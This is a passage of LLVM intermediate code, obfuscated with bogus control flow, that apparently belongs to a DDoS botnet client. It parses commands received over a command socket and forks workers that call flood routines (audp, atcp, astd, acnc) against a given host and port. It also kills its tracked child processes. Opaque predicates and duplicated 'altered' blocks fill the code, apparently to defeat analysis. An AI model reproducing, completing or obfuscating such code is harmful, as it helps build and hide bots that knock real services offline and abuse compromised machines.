  %1130 = load i32, i32* @x.53
  %1131 = load i32, i32* @y.54
  %1132 = sub i32 %1130, 1
  %1133 = mul i32 %1130, %1132
  %1134 = urem i32 %1133, 2
  %1135 = icmp eq i32 %1134, 0
  %1136 = icmp slt i32 %1131, 10
  %1137 = or i1 %1135, %1136
  br i1 %1137, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1129, label %1144, label %1138

; <label>:1138:                                   ; preds = %originalBBpart2148
  %1139 = load i8**, i8*** %12, align 8
  %1140 = getelementptr inbounds i8*, i8** %1139, i64 3
  %1141 = load i8*, i8** %1140, align 8
  %1142 = call i32 @atoi(i8* %1141) #10
  %1143 = icmp slt i32 %1142, 1
  br i1 %1143, label %1144, label %1161

; <label>:1144:                                   ; preds = %1138, %originalBBpart2148, %1113
  %1145 = load i32, i32* @x.53
  %1146 = load i32, i32* @y.54
  %1147 = sub i32 %1145, 1
  %1148 = mul i32 %1145, %1147
  %1149 = urem i32 %1148, 2
  %1150 = icmp eq i32 %1149, 0
  %1151 = icmp slt i32 %1146, 10
  %1152 = or i1 %1150, %1151
  br i1 %1152, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1144
  %1153 = load i32, i32* @x.53
  %1154 = load i32, i32* @y.54
  %1155 = sub i32 %1153, 1
  %1156 = mul i32 %1153, %1155
  %1157 = urem i32 %1156, 2
  %1158 = icmp eq i32 %1157, 0
  %1159 = icmp slt i32 %1154, 10
  %1160 = or i1 %1158, %1159
  br i1 %1160, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1421

; <label>:1161:                                   ; preds = %1138
  %1162 = load i8**, i8*** %12, align 8
  %1163 = getelementptr inbounds i8*, i8** %1162, i64 1
  %1164 = load i8*, i8** %1163, align 8
  store i8* %1164, i8** %40, align 8
  %1165 = load i8**, i8*** %12, align 8
  %1166 = getelementptr inbounds i8*, i8** %1165, i64 2
  %1167 = load i8*, i8** %1166, align 8
  %1168 = call i32 @atoi(i8* %1167) #10
  store i32 %1168, i32* %41, align 4
  %1169 = load i8**, i8*** %12, align 8
  %1170 = getelementptr inbounds i8*, i8** %1169, i64 3
  %1171 = load i8*, i8** %1170, align 8
  %1172 = call i32 @atoi(i8* %1171) #10
  store i32 %1172, i32* %42, align 4
  %1173 = load i8*, i8** %40, align 8
  %1174 = call i8* @strstr(i8* %1173, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %1175 = icmp ne i8* %1174, null
  br i1 %1175, label %1176, label %1258

; <label>:1176:                                   ; preds = %1161
  %1177 = load i8*, i8** %40, align 8
  %1178 = call i8* @strtok(i8* %1177, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1178, i8** %43, align 8
  br label %1179

; <label>:1179:                                   ; preds = %originalBBpart2164, %1176
  %1180 = load i8*, i8** %43, align 8
  %1181 = icmp ne i8* %1180, null
  br i1 %1181, label %1182, label %1241

; <label>:1182:                                   ; preds = %1179
  %1183 = load i32, i32* @x.53
  %1184 = load i32, i32* @y.54
  %1185 = sub i32 %1183, 1
  %1186 = mul i32 %1183, %1185
  %1187 = urem i32 %1186, 2
  %1188 = icmp eq i32 %1187, 0
  %1189 = icmp slt i32 %1184, 10
  %1190 = or i1 %1188, %1189
  br i1 %1190, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1182
  %1191 = call i32 @listFork()
  %1192 = icmp ne i32 %1191, 0
  %1193 = load i32, i32* @x.53
  %1194 = load i32, i32* @y.54
  %1195 = sub i32 %1193, 1
  %1196 = mul i32 %1193, %1195
  %1197 = urem i32 %1196, 2
  %1198 = icmp eq i32 %1197, 0
  %1199 = icmp slt i32 %1194, 10
  %1200 = or i1 %1198, %1199
  br i1 %1200, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1192, label %1223, label %1201

; <label>:1201:                                   ; preds = %originalBBpart2156
  %1202 = load i32, i32* @x.53
  %1203 = load i32, i32* @y.54
  %1204 = sub i32 %1202, 1
  %1205 = mul i32 %1202, %1204
  %1206 = urem i32 %1205, 2
  %1207 = icmp eq i32 %1206, 0
  %1208 = icmp slt i32 %1203, 10
  %1209 = or i1 %1207, %1208
  br i1 %1209, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1201
  %1210 = load i8*, i8** %43, align 8
  %1211 = load i32, i32* %41, align 4
  %1212 = load i32, i32* %42, align 4
  call void @acnc(i8* %1210, i32 %1211, i32 %1212)
  %1213 = load i32, i32* @mainCommSock, align 4
  %1214 = call i32 @close(i32 %1213)
  call void @_exit(i32 0) #11
  %1215 = load i32, i32* @x.53
  %1216 = load i32, i32* @y.54
  %1217 = sub i32 %1215, 1
  %1218 = mul i32 %1215, %1217
  %1219 = urem i32 %1218, 2
  %1220 = icmp eq i32 %1219, 0
  %1221 = icmp slt i32 %1216, 10
  %1222 = or i1 %1220, %1221
  br i1 %1222, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  unreachable

; <label>:1223:                                   ; preds = %originalBBpart2156
  %1224 = load i32, i32* @x.53
  %1225 = load i32, i32* @y.54
  %1226 = sub i32 %1224, 1
  %1227 = mul i32 %1224, %1226
  %1228 = urem i32 %1227, 2
  %1229 = icmp eq i32 %1228, 0
  %1230 = icmp slt i32 %1225, 10
  %1231 = or i1 %1229, %1230
  br i1 %1231, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1223
  %1232 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1232, i8** %43, align 8
  %1233 = load i32, i32* @x.53
  %1234 = load i32, i32* @y.54
  %1235 = sub i32 %1233, 1
  %1236 = mul i32 %1233, %1235
  %1237 = urem i32 %1236, 2
  %1238 = icmp eq i32 %1237, 0
  %1239 = icmp slt i32 %1234, 10
  %1240 = or i1 %1238, %1239
  br i1 %1240, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %1179

; <label>:1241:                                   ; preds = %1179
  %1242 = load i32, i32* @x.53
  %1243 = load i32, i32* @y.54
  %1244 = sub i32 %1242, 1
  %1245 = mul i32 %1242, %1244
  %1246 = urem i32 %1245, 2
  %1247 = icmp eq i32 %1246, 0
  %1248 = icmp slt i32 %1243, 10
  %1249 = or i1 %1247, %1248
  br i1 %1249, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1241
  %1250 = load i32, i32* @x.53
  %1251 = load i32, i32* @y.54
  %1252 = sub i32 %1250, 1
  %1253 = mul i32 %1250, %1252
  %1254 = urem i32 %1253, 2
  %1255 = icmp eq i32 %1254, 0
  %1256 = icmp slt i32 %1251, 10
  %1257 = or i1 %1255, %1256
  br i1 %1257, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1282

; <label>:1258:                                   ; preds = %1161
  %1259 = load i32, i32* @x.53
  %1260 = load i32, i32* @y.54
  %1261 = sub i32 %1259, 1
  %1262 = mul i32 %1259, %1261
  %1263 = urem i32 %1262, 2
  %1264 = icmp eq i32 %1263, 0
  %1265 = icmp slt i32 %1260, 10
  %1266 = or i1 %1264, %1265
  br i1 %1266, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1258
  %1267 = call i32 @listFork()
  %1268 = icmp ne i32 %1267, 0
  %1269 = load i32, i32* @x.53
  %1270 = load i32, i32* @y.54
  %1271 = sub i32 %1269, 1
  %1272 = mul i32 %1269, %1271
  %1273 = urem i32 %1272, 2
  %1274 = icmp eq i32 %1273, 0
  %1275 = icmp slt i32 %1270, 10
  %1276 = or i1 %1274, %1275
  br i1 %1276, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %1268, label %1277, label %1278

; <label>:1277:                                   ; preds = %originalBBpart2172
  br label %1421

; <label>:1278:                                   ; preds = %originalBBpart2172
  %1279 = load i8*, i8** %40, align 8
  %1280 = load i32, i32* %41, align 4
  %1281 = load i32, i32* %42, align 4
  call void @acnc(i8* %1279, i32 %1280, i32 %1281)
  call void @_exit(i32 0) #11
  unreachable

; <label>:1282:                                   ; preds = %originalBBpart2168
  br label %1283

; <label>:1283:                                   ; preds = %1282, %1107
  %1284 = load i32, i32* @x.53
  %1285 = load i32, i32* @y.54
  %1286 = sub i32 %1284, 1
  %1287 = mul i32 %1284, %1286
  %1288 = urem i32 %1287, 2
  %1289 = icmp eq i32 %1288, 0
  %1290 = icmp slt i32 %1285, 10
  %1291 = or i1 %1289, %1290
  br i1 %1291, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1283
  %1292 = load i8**, i8*** %12, align 8
  %1293 = getelementptr inbounds i8*, i8** %1292, i64 0
  %1294 = load i8*, i8** %1293, align 8
  %1295 = call i32 @strcmp(i8* %1294, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0)) #10
  %1296 = icmp ne i32 %1295, 0
  %1297 = load i32, i32* @x.53
  %1298 = load i32, i32* @y.54
  %1299 = sub i32 %1297, 1
  %1300 = mul i32 %1297, %1299
  %1301 = urem i32 %1300, 2
  %1302 = icmp eq i32 %1301, 0
  %1303 = icmp slt i32 %1298, 10
  %1304 = or i1 %1302, %1303
  br i1 %1304, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1296, label %1421, label %1305

; <label>:1305:                                   ; preds = %originalBBpart2176
  %1306 = load i32, i32* @x.53
  %1307 = load i32, i32* @y.54
  %1308 = sub i32 %1306, 1
  %1309 = mul i32 %1306, %1308
  %1310 = urem i32 %1309, 2
  %1311 = icmp eq i32 %1310, 0
  %1312 = icmp slt i32 %1307, 10
  %1313 = or i1 %1311, %1312
  br i1 %1313, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1305
  store i32 0, i32* %44, align 4
  store i64 0, i64* %45, align 8
  %1314 = load i32, i32* @x.53
  %1315 = load i32, i32* @y.54
  %1316 = sub i32 %1314, 1
  %1317 = mul i32 %1314, %1316
  %1318 = urem i32 %1317, 2
  %1319 = icmp eq i32 %1318, 0
  %1320 = icmp slt i32 %1315, 10
  %1321 = or i1 %1319, %1320
  br i1 %1321, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %1322

; <label>:1322:                                   ; preds = %originalBBpart2210, %originalBBpart2180
  %1323 = load i64, i64* %45, align 8
  %1324 = load i64, i64* @numpids, align 8
  %1325 = icmp ult i64 %1323, %1324
  br i1 %1325, label %1326, label %1399

; <label>:1326:                                   ; preds = %1322
  %1327 = load i32, i32* @x.53
  %1328 = load i32, i32* @y.54
  %1329 = sub i32 %1327, 1
  %1330 = mul i32 %1327, %1329
  %1331 = urem i32 %1330, 2
  %1332 = icmp eq i32 %1331, 0
  %1333 = icmp slt i32 %1328, 10
  %1334 = or i1 %1332, %1333
  br i1 %1334, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1326
  %1335 = load i32*, i32** @pids, align 8
  %1336 = load i64, i64* %45, align 8
  %1337 = getelementptr inbounds i32, i32* %1335, i64 %1336
  %1338 = load i32, i32* %1337, align 4
  %1339 = icmp ne i32 %1338, 0
  %1340 = load i32, i32* @x.53
  %1341 = load i32, i32* @y.54
  %1342 = sub i32 %1340, 1
  %1343 = mul i32 %1340, %1342
  %1344 = urem i32 %1343, 2
  %1345 = icmp eq i32 %1344, 0
  %1346 = icmp slt i32 %1341, 10
  %1347 = or i1 %1345, %1346
  br i1 %1347, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br i1 %1339, label %1348, label %1379

; <label>:1348:                                   ; preds = %originalBBpart2184
  %1349 = load i32*, i32** @pids, align 8
  %1350 = load i64, i64* %45, align 8
  %1351 = getelementptr inbounds i32, i32* %1349, i64 %1350
  %1352 = load i32, i32* %1351, align 4
  %1353 = call i32 @getpid() #6
  %1354 = icmp ne i32 %1352, %1353
  br i1 %1354, label %1355, label %1379

; <label>:1355:                                   ; preds = %1348
  %1356 = load i32, i32* @x.53
  %1357 = load i32, i32* @y.54
  %1358 = sub i32 %1356, 1
  %1359 = mul i32 %1356, %1358
  %1360 = urem i32 %1359, 2
  %1361 = icmp eq i32 %1360, 0
  %1362 = icmp slt i32 %1357, 10
  %1363 = or i1 %1361, %1362
  br i1 %1363, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1355
  %1364 = load i32*, i32** @pids, align 8
  %1365 = load i64, i64* %45, align 8
  %1366 = getelementptr inbounds i32, i32* %1364, i64 %1365
  %1367 = load i32, i32* %1366, align 4
  %1368 = call i32 @kill(i32 %1367, i32 9) #6
  %1369 = load i32, i32* %44, align 4
  %1370 = add nsw i32 %1369, 1
  store i32 %1370, i32* %44, align 4
  %1371 = load i32, i32* @x.53
  %1372 = load i32, i32* @y.54
  %1373 = sub i32 %1371, 1
  %1374 = mul i32 %1371, %1373
  %1375 = urem i32 %1374, 2
  %1376 = icmp eq i32 %1375, 0
  %1377 = icmp slt i32 %1372, 10
  %1378 = or i1 %1376, %1377
  br i1 %1378, label %originalBBpart2199, label %originalBB186alteredBB

originalBBpart2199:                               ; preds = %originalBB186
  br label %1379

; <label>:1379:                                   ; preds = %originalBBpart2199, %1348, %originalBBpart2184
  br label %1380

; <label>:1380:                                   ; preds = %1379
  %1381 = load i32, i32* @x.53
  %1382 = load i32, i32* @y.54
  %1383 = sub i32 %1381, 1
  %1384 = mul i32 %1381, %1383
  %1385 = urem i32 %1384, 2
  %1386 = icmp eq i32 %1385, 0
  %1387 = icmp slt i32 %1382, 10
  %1388 = or i1 %1386, %1387
  br i1 %1388, label %originalBB201, label %originalBB201alteredBB

originalBB201:                                    ; preds = %originalBB201alteredBB, %1380
  %1389 = load i64, i64* %45, align 8
  %1390 = add i64 %1389, 1
  store i64 %1390, i64* %45, align 8
  %1391 = load i32, i32* @x.53
  %1392 = load i32, i32* @y.54
  %1393 = sub i32 %1391, 1
  %1394 = mul i32 %1391, %1393
  %1395 = urem i32 %1394, 2
  %1396 = icmp eq i32 %1395, 0
  %1397 = icmp slt i32 %1392, 10
  %1398 = or i1 %1396, %1397
  br i1 %1398, label %originalBBpart2210, label %originalBB201alteredBB

originalBBpart2210:                               ; preds = %originalBB201
  br label %1322

; <label>:1399:                                   ; preds = %1322
  %1400 = load i32, i32* %44, align 4
  %1401 = icmp sgt i32 %1400, 0
  br i1 %1401, label %1402, label %1403

; <label>:1402:                                   ; preds = %1399
  br label %1420

; <label>:1403:                                   ; preds = %1399
  %1404 = load i32, i32* @x.53
  %1405 = load i32, i32* @y.54
  %1406 = sub i32 %1404, 1
  %1407 = mul i32 %1404, %1406
  %1408 = urem i32 %1407, 2
  %1409 = icmp eq i32 %1408, 0
  %1410 = icmp slt i32 %1405, 10
  %1411 = or i1 %1409, %1410
  br i1 %1411, label %originalBB212, label %originalBB212alteredBB

originalBB212:                                    ; preds = %originalBB212alteredBB, %1403
  %1412 = load i32, i32* @x.53
  %1413 = load i32, i32* @y.54
  %1414 = sub i32 %1412, 1
  %1415 = mul i32 %1412, %1414
  %1416 = urem i32 %1415, 2
  %1417 = icmp eq i32 %1416, 0
  %1418 = icmp slt i32 %1413, 10
  %1419 = or i1 %1417, %1418
  br i1 %1419, label %originalBBpart2215, label %originalBB212alteredBB

originalBBpart2215:                               ; preds = %originalBB212
  br label %1420

; <label>:1420:                                   ; preds = %originalBBpart2215, %1402
  br label %1421

; <label>:1421:                                   ; preds = %1420, %originalBBpart2176, %1277, %originalBBpart2152, %originalBBpart2140, %913, %741, %593, %440, %325, %277, %139
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %1422 = alloca i32, align 4
  %1423 = alloca i8**, align 8
  %1424 = alloca i8*, align 8
  %1425 = alloca i32, align 4
  %1426 = alloca i32, align 4
  %1427 = alloca i32, align 4
  %1428 = alloca i32, align 4
  %1429 = alloca i32, align 4
  %1430 = alloca i8*, align 8
  %1431 = alloca i8*, align 8
  %1432 = alloca i32, align 4
  %1433 = alloca i32, align 4
  %1434 = alloca i8*, align 8
  %1435 = alloca i8*, align 8
  %1436 = alloca i32, align 4
  %1437 = alloca i32, align 4
  %1438 = alloca i32, align 4
  %1439 = alloca i8*, align 8
  %1440 = alloca i32, align 4
  %1441 = alloca i32, align 4
  %1442 = alloca i8*, align 8
  %1443 = alloca i8*, align 8
  %1444 = alloca i32, align 4
  %1445 = alloca i32, align 4
  %1446 = alloca i32, align 4
  %1447 = alloca i8*, align 8
  %1448 = alloca i32, align 4
  %1449 = alloca i32, align 4
  %1450 = alloca i8*, align 8
  %1451 = alloca i8*, align 8
  %1452 = alloca i32, align 4
  %1453 = alloca i32, align 4
  %1454 = alloca i8*, align 8
  %1455 = alloca i32, align 4
  %1456 = alloca i64, align 8
  store i32 %0, i32* %1422, align 4
  store i8** %1, i8*** %1423, align 8
  %1457 = load i8**, i8*** %1423, align 8
  %1458 = getelementptr inbounds i8*, i8** %1457, i64 0
  %1459 = load i8*, i8** %1458, align 8
  %1460 = call i32 @strcmp(i8* %1459, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0)) #10
  %1461 = icmp ne i32 %1460, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  %1462 = load i32, i32* %11, align 4
  %1463 = icmp slt i32 %1462, 6
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %117
  %1464 = load i8**, i8*** %12, align 8
  %1465 = getelementptr inbounds i8*, i8** %1464, i64 6
  %1466 = load i8*, i8** %1465, align 8
  %1467 = call i32 @atoi(i8* %1466) #10
  %1468 = icmp slt i32 %1467, 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %162
  %1469 = load i8**, i8*** %12, align 8
  %1470 = getelementptr inbounds i8*, i8** %1469, i64 6
  %1471 = load i8*, i8** %1470, align 8
  %1472 = call i32 @atoi(i8* %1471) #10
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %183
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %200
  store i32 %201, i32* %18, align 4
  %1473 = load i8*, i8** %13, align 8
  %1474 = call i8* @strstr(i8* %1473, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %1475 = icmp ne i8* %1474, null
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %221
  %1476 = load i8*, i8** %13, align 8
  %1477 = call i8* @strtok(i8* %1476, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1477, i8** %19, align 8
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %246
  %1478 = load i8*, i8** %19, align 8
  %1479 = load i32, i32* %14, align 4
  %1480 = load i32, i32* %15, align 4
  %1481 = load i32, i32* %16, align 4
  %1482 = load i32, i32* %17, align 4
  %1483 = load i32, i32* %18, align 4
  call void @audp(i8* %1478, i32 %1479, i32 %1480, i32 %1481, i32 %1482, i32 %1483)
  %1484 = load i32, i32* @mainCommSock, align 4
  %1485 = call i32 @close(i32 %1484)
  call void @_exit(i32 0) #11
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %278
  %1486 = load i8*, i8** %13, align 8
  %1487 = load i32, i32* %14, align 4
  %1488 = load i32, i32* %15, align 4
  %1489 = load i32, i32* %16, align 4
  %1490 = load i32, i32* %17, align 4
  %1491 = load i32, i32* %18, align 4
  call void @audp(i8* %1486, i32 %1487, i32 %1488, i32 %1489, i32 %1490, i32 %1491)
  %1492 = load i32, i32* @mainCommSock, align 4
  %1493 = call i32 @close(i32 %1492)
  call void @_exit(i32 0) #11
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %341
  %1494 = load i8*, i8** %20, align 8
  %1495 = call i8* @strtok(i8* %1494, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1495, i8** %23, align 8
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %360
  %1496 = load i8*, i8** %23, align 8
  %1497 = icmp ne i8* %1496, null
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %386
  %1498 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1498, i8** %23, align 8
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %404
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %421
  %1499 = call i32 @listFork()
  %1500 = icmp ne i32 %1499, 0
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %446
  %1501 = load i8**, i8*** %12, align 8
  %1502 = getelementptr inbounds i8*, i8** %1501, i64 0
  %1503 = load i8*, i8** %1502, align 8
  %1504 = call i32 @strcmp(i8* %1503, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.33, i32 0, i32 0)) #10
  %1505 = icmp ne i32 %1504, 0
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %471
  %1506 = load i8**, i8*** %12, align 8
  %1507 = getelementptr inbounds i8*, i8** %1506, i64 3
  %1508 = load i8*, i8** %1507, align 8
  %1509 = call i32 @atoi(i8* %1508) #10
  %1510 = icmp eq i32 %1509, -1
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %499
  %1511 = load i8**, i8*** %12, align 8
  %1512 = getelementptr inbounds i8*, i8** %1511, i64 4
  %1513 = load i8*, i8** %1512, align 8
  %1514 = call i32 @atoi(i8* %1513) #10
  %1515 = icmp eq i32 %1514, -1
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %521
  %1516 = load i8**, i8*** %12, align 8
  %1517 = getelementptr inbounds i8*, i8** %1516, i64 4
  %1518 = load i8*, i8** %1517, align 8
  %1519 = call i32 @atoi(i8* %1518) #10
  %1520 = icmp sgt i32 %1519, 32
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %546
  %1521 = load i8**, i8*** %12, align 8
  %1522 = getelementptr inbounds i8*, i8** %1521, i64 6
  %1523 = load i8*, i8** %1522, align 8
  %1524 = call i32 @atoi(i8* %1523) #10
  %1525 = icmp slt i32 %1524, 0
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %571
  %1526 = load i8**, i8*** %12, align 8
  %1527 = getelementptr inbounds i8*, i8** %1526, i64 7
  %1528 = load i8*, i8** %1527, align 8
  %1529 = call i32 @atoi(i8* %1528) #10
  %1530 = icmp slt i32 %1529, 1
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %620
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %637
  store i32 %638, i32* %29, align 4
  %1531 = load i32, i32* %11, align 4
  %1532 = icmp sgt i32 %1531, 6
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %668
  %1533 = load i8*, i8** %24, align 8
  %1534 = call i8* @strtok(i8* %1533, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1534, i8** %31, align 8
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %687
  %1535 = load i8*, i8** %31, align 8
  %1536 = icmp ne i8* %1535, null
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %719
  %1537 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1537, i8** %31, align 8
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %766
  %1538 = load i8**, i8*** %12, align 8
  %1539 = getelementptr inbounds i8*, i8** %1538, i64 0
  %1540 = load i8*, i8** %1539, align 8
  %1541 = call i32 @strcmp(i8* %1540, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1542 = icmp ne i32 %1541, 0
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %788
  %1543 = load i32, i32* %11, align 4
  %1544 = icmp slt i32 %1543, 6
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %807
  %1545 = load i8**, i8*** %12, align 8
  %1546 = getelementptr inbounds i8*, i8** %1545, i64 3
  %1547 = load i8*, i8** %1546, align 8
  %1548 = call i32 @atoi(i8* %1547) #10
  %1549 = icmp eq i32 %1548, -1
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %829
  %1550 = load i8**, i8*** %12, align 8
  %1551 = getelementptr inbounds i8*, i8** %1550, i64 2
  %1552 = load i8*, i8** %1551, align 8
  %1553 = call i32 @atoi(i8* %1552) #10
  %1554 = icmp eq i32 %1553, -1
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %857
  %1555 = load i8**, i8*** %12, align 8
  %1556 = getelementptr inbounds i8*, i8** %1555, i64 4
  %1557 = load i8*, i8** %1556, align 8
  %1558 = call i32 @atoi(i8* %1557) #10
  %1559 = icmp sgt i32 %1558, 32
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %891
  %1560 = load i8**, i8*** %12, align 8
  %1561 = getelementptr inbounds i8*, i8** %1560, i64 7
  %1562 = load i8*, i8** %1561, align 8
  %1563 = call i32 @atoi(i8* %1562) #10
  %1564 = icmp slt i32 %1563, 1
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %945
  %1565 = load i8**, i8*** %12, align 8
  %1566 = getelementptr inbounds i8*, i8** %1565, i64 6
  %1567 = load i8*, i8** %1566, align 8
  %1568 = call i32 @atoi(i8* %1567) #10
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %967
  store i32 %968, i32* %38, align 4
  %1569 = load i8*, i8** %32, align 8
  %1570 = call i8* @strstr(i8* %1569, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %1571 = icmp ne i8* %1570, null
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %988
  %1572 = load i8*, i8** %32, align 8
  %1573 = call i8* @strtok(i8* %1572, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1573, i8** %39, align 8
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1032
  %1574 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1574, i8** %39, align 8
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1054
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1071
  %1575 = load i8*, i8** %32, align 8
  %1576 = load i32, i32* %33, align 4
  %1577 = load i32, i32* %34, align 4
  call void @astd(i8* %1575, i32 %1576, i32 %1577)
  %1578 = load i8*, i8** %32, align 8
  %1579 = load i32, i32* %33, align 4
  %1580 = load i32, i32* %34, align 4
  %1581 = load i32, i32* %35, align 4
  %1582 = load i32, i32* %38, align 4
  %1583 = load i32, i32* %37, align 4
  call void @audp(i8* %1578, i32 %1579, i32 %1580, i32 %1581, i32 %1582, i32 %1583)
  %1584 = load i8*, i8** %32, align 8
  %1585 = load i32, i32* %33, align 4
  %1586 = load i32, i32* %34, align 4
  %1587 = load i32, i32* %35, align 4
  %1588 = load i8*, i8** %36, align 8
  %1589 = load i32, i32* %38, align 4
  %1590 = load i32, i32* %37, align 4
  call void @atcp(i8* %1584, i32 %1585, i32 %1586, i32 %1587, i8* %1588, i32 %1589, i32 %1590)
  %1591 = load i32, i32* @mainCommSock, align 4
  %1592 = call i32 @close(i32 %1591)
  call void @_exit(i32 0) #11
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1116
  %1593 = load i8**, i8*** %12, align 8
  %1594 = getelementptr inbounds i8*, i8** %1593, i64 2
  %1595 = load i8*, i8** %1594, align 8
  %1596 = call i32 @atoi(i8* %1595) #10
  %1597 = icmp slt i32 %1596, 1
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1144
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1182
  %1598 = call i32 @listFork()
  %1599 = icmp ne i32 %1598, 0
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1201
  %1600 = load i8*, i8** %43, align 8
  %1601 = load i32, i32* %41, align 4
  %1602 = load i32, i32* %42, align 4
  call void @acnc(i8* %1600, i32 %1601, i32 %1602)
  %1603 = load i32, i32* @mainCommSock, align 4
  %1604 = call i32 @close(i32 %1603)
  call void @_exit(i32 0) #11
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1223
  %1605 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %1605, i8** %43, align 8
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1241
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1258
  %1606 = call i32 @listFork()
